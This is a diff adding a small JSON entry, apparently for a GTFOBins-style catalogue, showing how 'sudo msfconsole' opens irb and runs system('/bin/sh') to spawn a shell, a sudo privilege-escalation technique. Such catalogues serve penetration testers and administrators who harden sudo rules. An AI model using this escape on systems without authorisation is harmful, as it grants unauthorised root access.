@@ -1,0 +1,15 @@
+{
+  "description": "This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.",
+  "functions": {
+    "shell": [
+      {
+        "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
+      }
+    ]
+  }
+}
